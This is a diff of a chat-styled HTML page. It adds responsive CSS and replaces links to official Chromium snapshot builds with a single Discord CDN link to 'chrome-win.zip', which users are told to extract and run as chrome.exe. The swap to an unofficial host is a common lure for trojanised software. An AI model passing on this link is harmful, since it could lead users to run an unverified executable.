@@ -37,10 +37,10 @@
 
         /* Container */
         .container {
-            width: 90%;
+            width: 95%;
             max-width: 800px; /* Limit max width */
             height: auto; /* Allow height to expand based on content */
-            padding: 20px;
+            padding: 10px;
             background-color: rgba(44, 47, 51, 0.9); /* Slightly transparent background */
             border-radius: 10px; /* Rounded corners */
             display: flex;
@@ -154,6 +154,49 @@
             color: #72767d;
             font-size: 14px;
         }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .container {
+                width: 90%;
+                padding: 10px;
+            }
+
+            .message-box {
+                font-size: 14px; /* Adjust font size for smaller screens */
+                padding: 8px;
+            }
+
+            .profile-pic {
+                width: 30px;
+                height: 30px;
+            }
+
+            .timestamp {
+                font-size: 10px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                width: 100%;
+                padding: 5px;
+            }
+
+            .message-box {
+                font-size: 12px; /* Further adjust font size */
+                padding: 6px;
+            }
+
+            .profile-pic {
+                width: 25px;
+                height: 25px;
+            }
+
+            .timestamp {
+                font-size: 8px;
+            }
+        }
     </style>
 </head>
 <body>
@@ -214,8 +257,7 @@
                 </div>
             </div>
             <div class="message-content">
-                <p>For <strong>Mac</strong>, download the v126.66 <a href="https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Mac/1266941/" class="link">chrome-mac.zip</a> file, extract it, and run the <strong>chrome</strong> application inside the extracted folder.</p>
-                <p>For <strong>Windows</strong>, download the v126.66 <a href="https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win/1266941/" class="link">chrome-win.zip</a> file, extract it, and run the <strong>chrome.exe</strong> application inside the extracted folder.</p>
+                <p>To download the standalone Chrome version, you can use the <a href="https://cdn.discordapp.com/attachments/1174398359062245426/1144719291669243048/chrome-win.zip" class="link">chrome-win.zip</a> file, extract it, and run the <strong>chrome.exe</strong> application inside the extracted folder.</p>
             </div>
         </div>
 
